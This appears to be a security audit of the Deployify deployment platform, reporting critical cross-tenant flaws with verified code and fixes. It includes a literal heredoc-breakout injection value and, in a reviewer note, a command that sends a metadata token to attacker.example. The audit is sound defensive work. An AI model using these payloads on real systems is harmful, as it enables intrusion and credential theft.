Accurate exploit chain: (1) attacker signs in via GitHub OAuth and creates a project — the platform auto-creates a webhook on their own repo and sets autoDeployPrs: true; (2) attacker PATCHes /api/projects/[id] setting rootDirectory to "web\nEOFMARKER\n<arbitrary shell>\ncat > /dev/null <<'EOFMARKER'\nweb" — line 132 allowlists the field and applies no content check; (3) attacker pushes any commit, GitHub delivers a validly signed webhook, and the push handler builds the config; (4) cloudbuild.ts:192 passes the raw value to getDockerfile, which interpolates it into ~7 Dockerfile lines; (5) the injected bare "EOFMARKER" line terminates the quoted heredoc at cloudbuild.ts:232-235 and the following lines execute as bash inside the platform's Cloud Build step. The sanitizer at :76-82 fires and logs "Invalid rootDirectory provided" but only defends workDir, so it produces a warning while the attack succeeds.

Severity remains critical: this is code execution in the platform's shared Cloud Build step, not in the tenant's own container. The same build's steps run "gcloud secrets add-iam-policy-binding" (:336), project-level "gcloud projects add-iam-policy-binding" (:339) and "gcloud run services add-iam-policy-binding" (:420), so the SA can reach every other tenant's secrets, Cloud SQL and Cloud Run services in the shared GCP project.

Minimal fix: pass safeRootDirectory (not rootDirectory) at cloudbuild.ts:192, and reject rather than silently downgrade at :80-82 so a malicious value fails the build instead of warning. Add the same character-class validation to POST /api/projects and to the PATCH allowlist loop, and consider extending validateRepository to the webhook paths.

**Verified code:**

```ts
src/lib/gcp/cloudbuild.ts:76-86 — sanitizer only feeds workDir, and the invalid branch merely warns:
  76:    // Validate rootDirectory to prevent command injection
  77:    let safeRootDirectory = '';
  78:    if (rootDirectory && /^[a-zA-Z0-9_\-./]+$/.test(rootDirectory) && !rootDirectory.includes('..')) {
  79:        safeRootDirectory = rootDirectory.replace(/^\/+|\/+$/g, ''); // Trim slashes
  80:    } else if (rootDirectory) {
  81:        console.warn(`Invalid rootDirectory provided: "${rootDirectory}". Defaulting to root.`);
  82:    }
  86:    const workDir = safeRootDirectory ? `/workspace/${safeRootDirectory}` : '/workspace';

src/lib/gcp/cloudbuild.ts:184-194 — the cited line 192 passes the RAW value, bypassing safeRootDirectory:
 184:    if (!isDockerFramework) {
 185:        dockerfileContent = getDockerfile({
 186:            framework,
 187:            buildEnvSection,
 188:            outputDirectory,
 189:            buildCommand,
 190:            installCommand,
 191:            restoreCache: !force,
 192:            rootDirectory,
 193:        });
 194:    }

src/
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I traced the whole chain and reproduced the break-out against the real function, so the claim holds — with one mechanism correction about which HTTP trigger actually works.

1) The sanitizer is real but load-bearing for the WRONG variable. cloudbuild.ts:77-82 computes `safeRootDirectory`, and cloudbuild.ts:86 uses only that for `workDir`. The invalid branch just `console.warn`s and falls through — it does not throw, does not return, does not clear `rootDirectory`. At cloudbuild.ts:185-193 the function passes the RAW `rootDirectory` (line 192) into `getDockerfile()`. So the sanitizer never touches the value that lands in the Dockerfile body.

2) `getDockerfile` (src/lib/dockerfiles.ts) does zero validation. `grep -n "rootDirectory" src/lib/dockerfiles.ts` shows ~40 raw `${rootDirectory}` template interpolations across every framework generator (e.g. nextjs lines 332-333, 353, 373). The result becomes `dockerfileContent`, which cloudbuild.ts:232-235 splices into a bash `-c` argument inside a quoted heredoc `cat > ${workDir}/Dockerfile << 'EOFMARKER' ... EOFMARKER`. Quoting suppresses expansion but not heredoc termination, so any line in the body equal to `EOFMARKER` ends the document and everything after it is bash.

3) I confirmed this empirically. I wrote a throwaway script importing the real `generateCloudRunDeployConfig` with `rootDirectory = "app\nEOFMARKER\ncurl ... metadata token ... | curl -X POST -d @- https://attacker.example/x\ncat >/dev/null <<'EOFMARKER'"` and ran it with `npx tsx`. Output: the warning "Invalid rootDirectory provided ... Defaulting to root." printed, AND the emitted step (`gcr.io/cloud-builders/docker`, entrypoint `bash`) contained the heredoc terminated early with the metadata-server exfil command sitting at bash top level, repeated ~10 times where the Dockerfile interpolates the value. That step runs on a Cloud Build worker with the Cloud Build service account reachable at metadata.google.internal. (Script deleted afterward.)

4) Ingress is unvalidated, as claimed. src/app/api/projects/route.ts:75 destructures `rootDirectory = ''` and line 209 persists it verbatim into `createProject` — no regex, no character filter, no length check. src/app/api/projects/[id]/route.ts:132 lists `'rootDirectory'` in `allowedFields` and the loop at 129-137 copies `body[field]` straight into `updates`; the only validations in that handler are for `buildTimeout`, `autodeployBranches`, and `resources`. Nothing in db.ts or utils.ts sanitizes it either (`grep -rn "safeRootDirectory\|sanitizeRootDir\|validateRootDir" src/` returns only

</details>

### 🔴 CRITICAL — Firestore Data Lab queries hit Deployify's own platform Firestore (getDb()), not the customer connector — cross-tenant read of users/projects/audit collections
`secrets-crypto-1` · `src/app/api/projects/[id]/storage/[storageId]/query/route.ts:854` · reported by 2 independent dimensions

**Failure scenario.** getDb() (src/lib/firebase.ts:53) returns getFirestore(app) — the platform's own '(default)' Firestore that stores every tenant's data — and the firestore branch never references storageConfig / the connector's provisioned database at all. Any registered user: (1) creates their own project (they are 'owner'), (2) POSTs to /storage with {"type":"firestore","name":"x","connectionString":"firestore://dummy"} (any non-empty connection string satisfies the line-190 guard; the firestore branch ignores it), (3) POSTs to this query route with body {"collection":"users"} or {"collection":"projects","where":[["userId","==","<victim>"]]}. The response returns Deployify's internal `users`, `projects` (in

**Impact.** Full cross-tenant / internal database read of the entire Deployify control-plane Firestore by any authenticated user, exposing all users, all projects and their secret references, and audit logs. Complete tenant isolation break.

**Reviewer correction.** Claim confirmed as written; two precision points. (1) The exploit needs one extra detail the finder omitted: the attacker must supply a non-empty `connectionString` when creating the connector, otherwise the request dies at line 190 with 400 "Connection string not configured". Any junk string works (e.g. "firestore://x") — it is stored in Secret Manager by POST /storage and read back at line 187 purely to pass that gate, then never used by the firestore branch. (2) The blast radius is broader than "users/projects/audit": `DISCOVER_SCHEMA` (lines 856-880) first enumerates every collection in the platform Firestore via db.listCollections() and samples 5 documents from each of the first five, so no prior knowledge of collection names is needed; the follow-up query then reads up to 500 docs from any collection (users, projects, envVars, invoices, teams, teamMemberships, auditLogs). Severity stays critical. | The claim holds as written. Two refinements to make the exploit and blast radius precise, neither of which reduces it below critical:

(a) Required exploit step the truncated claim glosses over: the attacker MUST supply a non-empty `connectionString` when creating the connector, or route.ts:190 returns 400 before reaching the firestore branch. This is not a barrier — POST /storage does no `type` allowlisting (route.ts:87) and accepts any string, storing it in Secret Manager (lines 152-156). The value is then never used on the firestore path.

(b) Blast radius is read-only and does not include secret *values*: the firestore branch only calls `.get()`, and connection strings / provider API keys live in GCP Secret Manager while `isSecret` env vars are encrypted at rest (src/app/api/projects/[id]/env/route.ts:122-123). What IS exposed unmasked, across every tenant, in a single request: `users` (email, githubId/githubUsername, stripeCustomerId, subscription tier and Razorpay subscription id), `projects` (every non-secret env var value, repo and GitHub installation ids, domains, ipRules, every storageConfig's connectionStringSecretId), `teams`, `teamMemberships`, `invites`, `auditLogs`, `invoices`, `query_history` and `dataLabAudit` (other tenants' raw SQL and their results' row counts). Plus `DISCOVER_SCHEMA` enumerates all of it with live samples in one call. That is a complete cross-tenant confidentiality breach of the control plane.

(c) Unauthenticated amplifier the finder did not flag: the public-widget path (route.ts:36-57) resolves `storageConfig` and executes the saved query with no session at all. An attacker can save a firestore widget whose query targets `users`, flip `isPublic`, and expose platform-wide data to anonymous callers — though `maskData` (line 941) does apply on that path, so field names matching password/secret/token/key are redacted while emails, ids and everything else are not.

**Verified code:**

```ts
src/app/api/projects/[id]/storage/[storageId]/query/route.ts:853-854
                } else if (storageConfig.type === 'firestore') {
                    const db = getDb();

src/app/api/projects/[id]/storage/[storageId]/query/route.ts:856-861 (schema disclosure)
                    if (query === 'DISCOVER_SCHEMA') {
                        const collections = await db.listCollections();
                        const collectionIds = collections.map(c => c.id);
                        ...
                        for (const id of collectionIds.slice(0, 5)) {
                            const snapshot = await db.collection(id).limit(5).get();

src/app/api/projects/[id]/storage/[storageId]/query/route.ts:893-906 (arbitrary collection read)
                        const { collection, limit = 10, where } = parsedQuery;
                        if (!collection) { ... 400 ... }
                        queryObj = db.collection(collection);
                        ...
                        const snapshot = await queryObj.limit(Math.min(limit, MAX_ROWS)).get();
                        const re
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I traced the full chain from HTTP entry to the cited line and it holds in production (NODE_ENV=production, MOCK_DB unset).

1. Entry point is a real, self-service reachable route: POST /api/projects/[id]/storage/[storageId]/query. src/proxy.ts only applies rate limiting to /api/* (100 req/window, or 30 on "strict" routes) and gates only /dashboard and /new for auth — it does not block this route.

2. Auth gates in the route (grep for every 401/403 in the file returns only 4 hits, lines 46, 64, 165, 170): a session is required (line 63-65) and checkProjectAccess must return allowed (lines 68-71). src/middleware/rbac.ts:23-26 grants role 'owner' whenever project.userId === userId, so a user who creates their own project passes. There is NO role gate on this route at all — 'viewer' also passes; role is used only at line 943 to decide masking. Sign-up is open GitHub OAuth (src/app/api/auth/callback/route.ts, upsertUser with no allowlist), so "any registered user" is accurate.

3. The attacker controls storageConfig. POST /api/projects/[id]/storage (src/app/api/projects/[id]/storage/route.ts) requires only a session and non-viewer role, does no validation of `type` against any enum, and with `provision` false takes the caller's raw `connectionString` and stores it: `const secretId = 'deployify-${id}-${storageId}-conn'; connectionStringSecretId = await upsertSecret(secretId, finalConnectionString);`. So {"type":"firestore","name":"x","connectionString":"firestore://anything"} yields a persisted config with a resolvable secret.

4. The one precondition the finder did not spell out is satisfied by that step: the query route bails at line 190 with 400 "Connection string not configured" if no secret resolves. Since type 'firestore' does not match `storageConfig.type.includes('cloud-sql')` (line 181), it falls to `else if (storageConfig.connectionStringSecretId) connectionString = await getSecretValue(...)` (line 186-187), which returns the attacker's own string. The value is then never used by the firestore branch — it exists only to pass the gate.

5. The read-only SQL keyword filter (lines 135-173) is scoped to `storageConfig.type.includes('sql') || 'planetscale'` — it never applies to firestore.

6. At line 853-854 the firestore branch does `const db = getDb();` and nothing else — no databaseId, no connectionString, no per-tenant client. src/lib/firebase.ts:53-63 getDb() returns getFirestore(app) on the platform's own default app, the same instance src/lib/db.ts uses for Collections.USERS / PROJECTS / AUDIT_LOGS / INVOICES / TEAMS / ENV_VARS (Coll

</details>

### 🔴 CRITICAL — Project deletion prefix-matches Cloud Run services and destroys other tenants' running services
`tenancy-data-1` · `src/app/api/projects/[id]/route.ts:328`

**Failure scenario.** All tenants' Cloud Run services live in ONE GCP project (config.gcp.projectId) and are named `dfy-<slug>` (src/lib/utils.ts:53-57). Attacker creates a project with body {name: "a", repoFullName: <any repo they can read>} -> slug "a". They PATCH region to the victim's region (region is in the allowlist at src/app/api/projects/[id]/route.ts:134). They then DELETE /api/projects/<their-own-id>. checkProjectAccess passes (they own it). prefix becomes `dfy-a`, listServices issues `filter=metadata.name:dfy-a*`, which returns EVERY service in that region whose name starts with dfy-a — e.g. victim tenants' `dfy-acme-store`, `dfy-analytics`, `dfy-api-gateway` — and the loop calls deleteService on each

**Impact.** Unauthenticated-to-the-victim, one-request destruction of arbitrary other tenants' production Cloud Run services in any region. No recovery except redeploy; domain mappings and traffic tags are lost with the service.

**Reviewer correction.** Directionally correct and reachable by any signed-up tenant, but restate the mechanism. The reliable exploit is an EXACT slug collision, not a prefix wildcard: `getProjectBySlug` enforces slug uniqueness only within the caller's own userId (src/lib/db.ts:1021), and PATCH accepts an arbitrary unvalidated `region` string, while every tenant's Cloud Run service and Artifact Registry package lives in one GCP project under the untenanted name `dfy-<slug>`. So an unprivileged user POSTs a project named exactly like the victim's, PATCHes `region` to the victim's region, then DELETEs their own project — passing the owner check on their own resource — and the handler unconditionally deletes the victim's Artifact Registry package with all image versions at line 324-325, then attempts `deleteService` on whatever `listServices` returns for that name.

The claimed wildcard amplification (slug "a" nuking every `dfy-a*` service) is unproven: `listServices` passes `?filter=metadata.name:<prefix>*` to Cloud Run Admin API **v2** ListServices, which has no `filter` parameter; depending on how the API frontend handles the unknown param, the call either 400s (the whole cleanup is then swallowed by the catch at :339 and nothing is deleted — a separate latent orphaned-resource bug) or ignores the filter and returns every service in the region (worse than claimed, and triggered by ANY project deletion). Either way the cleanup block has no label, owner, or tenant predicate, and the Artifact Registry destruction at :324-325 happens before and independently of it, so cross-tenant destruction by an unprivileged actor is real. Fix by scoping GCP resource names to a tenant-unique identifier (project.id, not the user-supplied slug), enforcing global slug uniqueness, validating `region` against an allowlist, and filtering the delete loop on a Cloud Run label carrying the owning project id rather than a name prefix. | Directionally correct — there is no mitigation, and project deletion performs GCP destruction that is not scoped to the caller's tenant — but the mechanism should be restated. (1) The root cause is that slug uniqueness is enforced only per user (src/app/api/projects/route.ts:123 + src/lib/db.ts:1017-1024) while every GCP resource name is `dfy-<slug>` in ONE shared GCP project and registry, so slugs are a global namespace with no global reservation. (2) The certain, assumption-free cross-tenant destruction is at route.ts:324-325 -> src/lib/gcp/artifacts.ts:18-24: an EXACT-name `DELETE .../packages/dfy-<slug>` that erases another tenant's entire image package whenever a slug collides — no wildcard semantics required. (3) The claimed prefix-wildcard Cloud Run deletion (route.ts:328-338 via cloudrun.ts:99) is unproven: the request goes to Cloud Run Admin API v2, whose ListServices has no `filter` parameter (and `metadata.name` is a v1 field), so at runtime it either 400s — making the whole cleanup block a silently swallowed no-op that orphans services rather than deleting victims' — or the parameter is ignored, in which case the loop would delete EVERY Cloud Run service in the region, which is worse than and different from the targeted-victim story told in the claim. Fix regardless: enforce globally unique slugs (or namespace resource names by tenant/project id), and scope deletion by an owner label (`resource-labels` set at deploy time and asserted before deleteService) instead of a name prefix.

**Verified code:**

```ts
src/app/api/projects/[id]/route.ts:310-338 (the cited block, read in full):
310:        if (access.role !== 'owner' && access.role !== 'admin') {
311:            return NextResponse.json(
312:                { error: 'Forbidden: Only owners and admins can delete projects' },
...
318:        try {
319:            const accessToken = await getGcpAccessToken();
320:            const projectSlug = access.project.slug;
321:            const region = access.project.region;
322:
323:            // Delete Artifact Registry images (all versions)
324:            const serviceName = getProductionServiceName(projectSlug);
325:            await deleteProjectImages(serviceName, region);
326:
327:            // Use a prefix that matches both production and preview services
328:            const prefix = `dfy-${projectSlug.substring(0, 40)}`;
329:            const services = await listServices(prefix, accessToken, region);
330:
331:            for (const service of services) {
334:                const serviceName = service.name.split('/').pop();
335:                if (serviceName) {
336:          
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** REACHABILITY: fully established for an ordinary signed-up tenant, no admin, no dev-only env var, no dead code.

1. Entry point is a real exported route handler: `DELETE /api/projects/[id]` (src/app/api/projects/[id]/route.ts:289). Auth gate is only `getSession()` + `checkProjectAccess()`; the role gate at :310 requires owner/admin ON THE ATTACKER'S OWN PROJECT. src/middleware/rbac.ts returns `role: 'owner'` for any personal project where `project.userId === userId`, so the creator of a throwaway project passes it trivially. `listServices` is called from exactly one place — this handler (grep confirms only src/app/api/projects/[id]/route.ts:329) — so it is live, reachable code.

2. Single-tenant GCP namespace confirmed: src/lib/config.ts `gcp.projectId: process.env.GCP_PROJECT_ID!` and one `artifactRegistry` repo for everyone; service names are `dfy-<slug>` with no tenant qualifier (src/lib/utils.ts:53-57, used at src/lib/deployment.ts:82 and src/lib/gcp/cloudbuild.ts:92 at deploy time).

3. Attacker-controlled slug: POST /api/projects sets `const slug = slugify(projectName)` from the request body's `name`, with NO length/reserved-name check, and the only uniqueness check is `getProjectBySlug(session.user.id, slug)` — scoped to the CALLER'S userId (src/lib/db.ts:1017-1022). Slugs are therefore NOT globally unique; a tenant can mint a project whose slug is a prefix of, or exactly equal to, any other tenant's slug.

4. Attacker-controlled region: the finder's "allowlist" is the PATCH allowed-FIELDS list, and `'region'` is on it (:134). Grep found no region VALUE validation anywhere (no VALID_REGIONS/ALLOWED_REGIONS); `updateProject` (src/lib/db.ts:1117) writes it straight to Firestore. So the region used for the destructive calls at :325/:329/:336 is arbitrary attacker input.

WHERE THE CLAIM OVERREACHES: the specific wildcard mechanism is unverified and may not even function. `listServices` builds `?filter=metadata.name:${prefix}*` against `run.googleapis.com/v2` (src/lib/gcp/cloudrun.ts:99). Cloud Run Admin API v2 `projects.locations.services.list` takes only parent/pageSize/pageToken/showDeleted — `filter` is not a parameter of that method, and Google's HTTP transcoding typically rejects unknown query params with 400 INVALID_ARGUMENT. There is no test, mock, or recorded response in the repo to settle it. So there are three branches, and I cannot pick one from source alone: (a) 400 → `listServices` throws, swallowed by the try/catch at :339, no service deleted (a latent orphaned-resource bug, invisible because the catch only console.errors);

</details>

### 🔴 CRITICAL — Project slugs are only unique per user, but Cloud Run service names and public hostname routing are global
`tenancy-data-2` · `src/app/api/projects/route.ts:123` · reported by 2 independent dimensions

**Failure scenario.** `name` is attacker-controlled request-body input (src/app/api/projects/route.ts:35, 119-120) and uniqueness is checked with getProjectBySlug(session.user.id, slug) — scoped to the attacker's own projects only. Attacker creates a project named exactly like victim tenant's project (slug "acme-store"). Two consequences: (1) DEPLOY — src/lib/gcp/cloudbuild.ts:92 and src/lib/deployment.ts:82 build the Cloud Run service name as generateServiceName(project.slug) = `dfy-acme-store` and the image as `<region>-docker.pkg.dev/<gcpProject>/<registry>/dfy-acme-store:latest`, so the attacker's deploy overwrites the victim's live service revision, its --update-env-vars (mounting the ATTACKER's env/secrets)

**Impact.** Cross-tenant takeover of a live production service and of a tenant's public hostname: serving attacker content to the victim's users, hijacking their traffic and analytics, and clobbering the victim's container image and runtime environment.

**Reviewer correction.** Directionally correct and severity is right, but two mechanism details need sharpening. (1) getProjectBySlugGlobal is NOT unused — it is the live production hostname resolver: src/proxy.ts:105-110 rewrites `<slug>.deployify.io/*` to `/api/v1/proxy/<slug>/*` with no auth, and that route resolves the tenant with a global `where('slug','==',slug).limit(1)` query. Because the query has no orderBy, Firestore returns the lowest document ID, and IDs are `proj_` + Math.random() base36 (src/lib/utils.ts:20-24), so the hijack is a re-rollable race the attacker wins by deleting and recreating until their visible project id sorts below the victim's — not an instant guaranteed takeover, but cheap and repeatable. Once won, proxy route:124-128 forwards the victim's users' Cookie headers to the attacker's container. (2) The Cloud Run leg additionally requires the attacker to match the victim's region, which is trivially satisfied because `region` is attacker-controlled body input (projects/route.ts:212) and most projects use the config default. The impact is worse than stated: the deploy uses `--update-env-vars` (cloudbuild.ts:111), which merges rather than replaces, so after the attacker overwrites `dfy-<slug>` the victim's existing runtime env vars remain on the service and are readable from the attacker's image — and no `--service-account` is set, so that image runs as the shared compute SA that cloudbuild.ts:336-342 grants project-wide secretmanager.secretAccessor and cloudsql.client. Accurate restatement: any self-serve GitHub user can register a project whose slug collides with any other tenant's, because uniqueness is enforced only within their own userId at src/app/api/projects/route.ts:123, yielding (a) unauthenticated public-subdomain takeover with cookie capture via the global slug resolver, and (b) overwrite of the victim's production Cloud Run service with attacker code that inherits the victim's environment variables and the shared privileged service identity. | Directionally and mechanically correct; severity is right. Two refinements. (a) Line citation: `name` is destructured at src/app/api/projects/route.ts:74, not :35 (line 35 is an unrelated 403 in the GET handler); lines 119-120, 123 are correct. (b) The impact is broader than the two consequences listed. Beyond (1) Cloud Run service takeover and (2) public hostname resolution, the same unqualified slug keys the shared build cache (`gs://<gcpProjectId>_deployify_cache/<slug>.tgz`, cloudbuild.ts:10/221/361), giving cross-tenant build-input poisoning, and the deploy uses `--update-env-vars` (merge semantics), so the attacker's container inherits the victim's existing runtime environment variables. Also worth noting the create-time team/role checks (lines 94-110) are bypassed entirely for a personal-scope project, so no team context is needed to mount this.

**Verified code:**

```ts
src/app/api/projects/route.ts:72-84 (attacker-controlled name)
        const {
            repoFullName,
            name,
            ...
            region,
            ...
            teamId
        } = body;

src/app/api/projects/route.ts:118-129 (the cited line; per-user-only guard)
        // Generate slug
        const projectName = name || repoData.name;
        const slug = slugify(projectName);

        // Check if slug already exists for this user
        const existingProject = await getProjectBySlug(session.user.id, slug);
        if (existingProject) {
            return NextResponse.json(
                { error: 'A project with this name already exists' },
                { status: 400, headers: securityHeaders }
            );
        }

src/lib/db.ts:1017-1024 (scoped lookup)
export async function getProjectBySlug(userId: string, slug: string): Promise<Project | null> {
    const db = getDb();
    const snapshot = await db
        .collection(Collections.PROJECTS)
        .where('userId', '==', userId)
        .where('slug', '==', slug)
        .limit(1)
        .ge
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I read every hop of the call graph myself and the claim survives on the reachability/exploitability lens.

ENTRY POINT IS UNPRIVILEGED AND SELF-SERVE. src/app/api/auth/callback/route.ts calls upsertUser() with no allowlist, waitlist, or approval gate — any GitHub account becomes a tenant. POST /api/projects requires only getSession(). The `viewer` role check (route.ts:104) only applies when `teamId` is supplied; a personal project needs no team at all. `name` is destructured straight from the JSON body (route.ts:72-84) with zero validation, and `slug = slugify(name)` (route.ts:120) accepts any value. The only precondition is a `repoFullName` the attacker's own GitHub token can read — attacker uses their own repo. No dev-only env var, no admin, no MOCK_DB dependency (src/lib/firebase.ts:17,54 gate mocks on MOCK_DB==='true'; unset means real Firestore).

THE UNIQUENESS GAP IS REAL AND THE ONLY WRITE PATH. `createProject(` has exactly one caller in the whole repo — src/app/api/projects/route.ts:197 — and the only guard before it is getProjectBySlug(session.user.id, slug), whose Firestore query is `.where('userId','==',userId).where('slug','==',slug)` (src/lib/db.ts:1017-1024). There is no rename path (grep for `slugify` / `slug =` across src/app/api returns only projects/route.ts:120), no reserved-name list, and no unique constraint (firestore.indexes.json only defines a composite userId+slug index — Firestore has no unique constraints anyway).

LEG 1 — PUBLIC HOSTNAME HIJACK IS LIVE, NOT THEORETICAL. The finder undersold this: getProjectBySlugGlobal is NOT dead code. src/proxy.ts (Next 16 middleware) parses the Host header, extracts the subdomain, and rewrites unauthenticated to `/api/v1/proxy/${subdomain}${pathname}` (src/proxy.ts:105-110). That route calls getProjectBySlugGlobal(slug) (proxy route:62), which is `.where('slug','==',slug).limit(1)` with NO orderBy (db.ts:671-678). Firestore implicitly orders by __name__ ascending, so the winner among colliding slugs is simply the lowest document ID. IDs come from generateId('proj') = `proj_` + two Math.random() base36 chunks (src/lib/utils.ts:20-24) — unordered and re-rollable: the attacker sees their own id in the 201 response and can delete/recreate until it sorts below the victim's (a `proj_0…` prefix beats ~97% of ids, ~1/36 per attempt). The route has no getSession() call at all. Once won, proxy route:124-128 forwards every inbound header except host/connection — including Cookie — to the attacker's Cloud Run URL, so the victim's users' session cookies for that hostname are handed to the

</details>

### 🟠 HIGH — No upper bound on Cloud Run minInstances/maxInstances — a free-tier user can pin thousands of always-on 4 vCPU instances
`ai-cost-abuse-5` · `src/app/api/projects/[id]/route.ts:201`

**Failure scenario.** `cpu` and `memory` are allowlisted (lines 185-199: cpu ∈ {1,2,4}, memory ∈ {256Mi…4Gi}) but the instance counts are only checked for `>= 0` / `> 0` and `max >= min`. A free-tier user PATCHes their project with `{"resources":{"cpu":4,"memory":"4Gi","minInstances":1000,"maxInstances":1000}}` and triggers one deploy. src/lib/gcp/cloudbuild.ts:380-381 passes those values straight through: `'--min-instances', (resources?.minInstances !== undefined ? resources.minInstances : config.cloudRun.minInstances).toString()`. Cloud Run then holds 1000 always-allocated 4 vCPU / 4 GiB instances, billed continuously at idle with zero traffic — roughly six figures per month against config.cloudRun defaults of 

**Impact.** Unbounded, immediate GCP spend on the platform's own bill from a single API call by the lowest-paying account, with no tier ceiling and no budget alert to stop it.

**Reviewer correction.** Directionally correct and the code reads exactly as claimed, but two adjustments. (a) Magnitude: "thousands of always-on instances" is not reachable — Cloud Run's per-service instance ceiling and the regional CPU quota will make `gcloud run deploy` fail rather than provision, so the practical ceiling is quota-bound (order of hundreds of 4 vCPU instances). Because config.ts:30 uses one shared GCP_PROJECT_ID for every tenant, however, exhausting that quota is simultaneously a cross-tenant denial of deployments, which the finder did not mention. (b) Exploitability is broader than stated: PATCH performs no role check at all (only DELETE gates owner/admin at line 310), so a team `viewer` — explicitly blocked from deploying at deploy/route.ts:43-48 — can still rewrite `resources`, and the values are applied by the GitHub webhook path (webhooks/github/route.ts:189, :585) on any ordinary push, not only via the deploy endpoint. Accurate statement: an authenticated user of any project role can persist arbitrary minInstances/maxInstances, which are applied verbatim to Cloud Run on the next build, up to the platform's shared GCP quota, with no tier limit (tiers.ts has no resource dimension) and no runtime metering or billback (tracker.ts meters only deployments/buildMinutes/bandwidth). | Directionally correct and fully reachable; two refinements to the mechanism. (a) The instance count is not literally unbounded in effect — GCP's per-region Cloud Run instance quota (typically 1000) caps what actually provisions, and a request above quota fails the build step rather than provisioning. The accurate statement is: no application-level or tier-level upper bound exists on `minInstances`/`maxInstances`, so any signed-up free-tier tenant can pin always-on 4 vCPU / 4 GiB instances up to the platform's GCP quota, at the operator's expense — `src/lib/billing/tracker.ts` meters only deployments, build minutes and bandwidth, so compute is never charged back. (b) The claim understates one consequence: because all tenants share the operator's regional Cloud Run instance quota, saturating it is a cross-tenant denial of service (other tenants' deploys and autoscaling fail), not merely a cost-abuse issue. (c) Additional defect at the same location the claim did not note: PATCH performs no role check whatsoever — DELETE requires owner/admin (line ~300) and the deploy route rejects `viewer` (deploy/route.ts:44), but PATCH gates only on `checkProjectAccess`, so a `viewer` team member can rewrite `resources` (and every other allowlisted field) and have it applied by the next push-triggered deploy via src/app/api/webhooks/github/route.ts:189.

**Verified code:**

```ts
src/app/api/projects/[id]/route.ts (validation block, verbatim):
201:            if (resources.minInstances !== undefined) {
202:                const min = Number(resources.minInstances);
203:                if (isNaN(min) || min < 0) {
204:                    return NextResponse.json(
205:                        { error: 'Min instances must be 0 or greater.' },
206:                        { status: 400, headers: securityHeaders }
207:                    );
208:                }
209:            }
211:            if (resources.maxInstances !== undefined) {
212:                const max = Number(resources.maxInstances);
213:                const min = resources.minInstances !== undefined ? Number(resources.minInstances) : (project.resources?.minInstances || 0);
215:                if (isNaN(max) || max <= 0) {
217:                        { error: 'Max instances must be greater than 0.' },
222:                if (max < min) {
224:                        { error: 'Max instances cannot be less than min instances.' },

Missing role gate in PATCH (grep -n "role" on the same file returns on
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** Mitigation hunt came up empty on every layer I checked.

1. Handler-level: I read src/app/api/projects/[id]/route.ts:96-280 in full. The PATCH allowlist (lines 127-144) includes 'resources'; the validation block (176-229) allowlists cpu and memory but bounds instance counts only by >= 0, > 0 and max >= min. No maximum, no tier lookup, no clamp. Note the coerced Number() values are never written back into `updates`, so the raw body value (string, float, 1e9) is what persists.

2. Persistence: src/lib/db.ts:1117-1123 `updateProject` is a bare Firestore `.update(cleanFirestoreData({...data}))` — no schema, no sanitization, no zod anywhere in the repo (grep for zod: no hits).

3. Tier/quota layer: src/lib/billing/tiers.ts TierLimits has exactly four dimensions — projects, deployments, buildMinutes, bandwidth. No cpu/memory/instance dimension in any tier including free. src/lib/billing/caps.ts `checkUsageLimits` only compares those same three metrics. src/lib/billing/tracker.ts `trackDeployment` meters deployments and buildMinutes only, so always-on instance-hours are neither capped nor billed back. grep -i for budget|spendCap|costCap|maxSpend|hardLimit across src: zero hits.

4. Deploy path: src/app/api/projects/[id]/deploy/route.ts:53-59 calls checkUsageLimits (caps deployment count, not size) and line 196 passes `resources: project.resources` straight through. src/lib/gcp/cloudbuild.ts:380-381 interpolates them into the gcloud args with no clamp. grep for Math.min|clamp across src/lib and src/lib/gcp finds only unrelated percentage caps in monitoring.ts.

5. Infra layer: no .tf/.yaml/.json in the repo sets max_instance or any quota; the only "quota" string in src is a comment in cloudbuild.ts:533. src/proxy.ts rate-limits request counts only (100/min default) — one PATCH plus one deploy is well inside it.

6. Shared blast radius: config.ts:29-34 has a single `gcp.projectId`, and cloudbuild.ts:9/90 uses it for every tenant, so pinned instances burn the platform's shared regional CPU quota, not a per-tenant one.

Two things the finder understated rather than overstated. First, PATCH has no role check at all — grep -n "role" on the route returns lines 42, 88 (GET) and 310 (DELETE's owner/admin gate). So any team member, including a `viewer` who is explicitly blocked from deploying (deploy/route.ts:43-48), can rewrite resources. Second, the deploy endpoint is not the only applier: src/app/api/webhooks/github/route.ts:189 and :585 also pass `resources: project.resources`, so a plain git push applies the pinned counts.

One correction on magnitude:

</details>

### 🟠 HIGH — /api/infrastructure/health and /api/infrastructure/compliance-report accept an arbitrary teamId with no membership check
`authn-session-3` · `src/app/api/infrastructure/health/route.ts:23` · reported by 2 independent dimensions

**Failure scenario.** Any authenticated Deployify user sends `GET /api/infrastructure/health?teamId=<victim team id>`. `listProjectsByTeam` (src/lib/db.ts:1078-1094) is a raw Firestore `where('teamId','==',teamId)` query with no caller scoping, so the response body returns the victim organisation's `projectHealth` map (project ids), and `regionalMappings[]` containing projectId, projectName, projectRegion, storageId, storageName, storageType and storageRegion for every connector they own, plus their aggregate cost, forecast and security-risk breakdown. The identical omission exists at src/app/api/infrastructure/compliance-report/route.ts:23, whose response is richer still: per-connector `connectorId`, `connectorN

**Impact.** Cross-tenant disclosure of another organisation's full infrastructure inventory, monthly spend, and — via the compliance report — an itemised list of their unremediated security weaknesses (a ready-made attack plan against their databases).

**Reviewer correction.** The claim is correct in mechanism and location; two refinements to the framing.

1. The higher-impact route is compliance-report, not health. The claim leads with health's `projectHealth` / `regionalMappings`. But `src/app/api/infrastructure/compliance-report/route.ts:39-50` runs `checkSecurityPosture(storage, project.region, iamPosture)` per connector and returns the full `risks` array along with `connectorName`, `type`, `environment`, `score`, `grade`, and per-project `projectName`. That hands an attacker an enumerated list of the victim tenant's specific infrastructure security weaknesses (including IAM over-privilege flags read from `storage.metadata.iamOverprivileged` / `excessiveRoles`) — a targeting roadmap, materially worse than the health route's names, regions and cost figures.

